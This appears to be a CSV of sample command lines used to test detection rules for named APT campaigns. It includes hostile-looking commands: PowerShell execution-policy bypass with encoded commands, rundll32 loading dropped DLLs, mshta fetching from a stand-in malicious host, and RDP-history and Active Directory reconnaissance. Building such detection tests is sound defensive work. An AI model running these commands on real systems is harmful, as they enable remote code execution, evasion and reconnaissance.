Folder,CommandLine
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\Data``Exchange.dll;Start
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\Data""Exchange.dll;Start
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll;Start
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll; Start
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\DataExchange;Start
sysmon_apt_muddywater_dnstunnel,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" Start-Process rundll32.exe C:\ProgramData\DataExchange.dll Start
win_apt_apt29_thinktanks,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -ep bypass $encodedCommand
win_apt_apt29_thinktanks,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noni -ExecutionPolicy bypass $encodedCommand
win_apt_apt29_thinktanks,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -ExecutionPolicy "bypass" $encodedCommand
win_apt_apt29_thinktanks,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep bypass $encodedCommand
win_apt_apt29_thinktanks,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NONI -EP bypass $encodedCommand
win_apt_apt29_thinktanks,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -ExecutionPolicy bypass $encodedCommand
win_apt_apt29_thinktanks,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noni -ep BYPASS $encodedCommand
win_apt_babyshark,cmd.exe /c taskkill.exe /im cmd.exe
win_apt_babyshark,cmd.exe /c taskkill.exe -im cmd.exe
win_apt_babyshark,powershell mshta http://malicioussite.com
win_apt_babyshark,cmd /c taskkill -im cmd.exe
win_apt_babyshark,reg "query" "HKEY_CURRENT_USER}\Software\Microsoft\Terminal Server Client\Default"
win_apt_babyshark,cmd.exe /c taskkill /im cmd.exe
win_apt_babyshark,reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
win_apt_babyshark,cmd /c taskkill /im cmd.exe
win_apt_babyshark,powershell mshta.exe http://malicioussite.com
win_apt_babyshark,powershell.exe mshta http://malicioussite.com
win_apt_babyshark,cmd /c taskkill.exe -im cmd.exe
win_apt_babyshark,powershell.exe mshta.exe http://malicioussite.com
win_apt_babyshark,reg.exe query "HKEY_CURRENT_USER}\Software\Microsoft\Terminal Server Client\Default"
win_apt_bear_activity_gtr19,C:\Windows\System32\xcopy.exe /E /S /C /Q /H \client\"Default User"\  C:\Users\"Default User"\
win_apt_bear_activity_gtr19,C:\Program Files\AdExplorer\adexplorer.exe /snapshot "" c:\users\sigma\test.snp
win_apt_bear_activity_gtr19,C:\Windows\System32\xcopy.exe \client\"Default User"\  C:\Users\"Default User"\ /E /S /C /Q /H
win_apt_bear_activity_gtr19,C:\Program Files\AdExplorer\adexplorer.exe -snapshot "" c:\users\sigma\test.snp
win_apt_bear_activity_gtr19,C:\Program Files\AdExplorer\adexplorer.exe -snapshot "" c:\users\sigma\test.snp
win_apt_bear_activity_gtr19,C:\Windows\System32\xcopy.exe /S/E/C/Q/H \client\"Default User"\  C:\Users\"Default User"\
win_apt_bear_activity_gtr19,"C:\Windows\System32\xcopy.exe /S /E /C /Q /H \client\"Default User"\  C:\Users\"Default User"\
win_apt_elise,"C:\Windows\System32\cmd.exe" /c del C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\Nav""ShExt.dll > nul
win_apt_elise,"C:\Windows\System32\cmd.exe" /c del "C:\Users\$User\AppData\Roaming\MICROS~1\Windows\Caches\NavShExt.dll" > nul
win_apt_elise,"C:\Windows\system32\rundll32.exe" C:\Users\admin\AppData\Roaming\MICROS\~1\Windows\Caches\Nav""ShExt.dll;Setting
